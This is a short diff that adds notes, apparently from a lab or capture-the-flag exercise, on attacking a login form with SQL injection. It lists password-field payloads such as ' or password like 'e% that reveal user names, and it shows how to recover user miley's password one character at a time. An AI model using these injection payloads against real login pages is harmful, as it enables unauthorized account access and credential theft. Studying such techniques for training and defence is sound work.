@@ -1,0 +1,18 @@
+queries to find unames:
+
+(leave username blank)
+' or password like 'e%
+returns 'Bill S Preston'
+
+(leave username blank)
+' or password like 'ea%
+returns 'Bart Simpson'
+
+(leave username blank)
+' or password like 't%
+returns 'Miley Cyrus'
+
+After you assume that the first name is the username continue adding characters onto the query until:
+username: miley
+' or password like 'top40x%
+
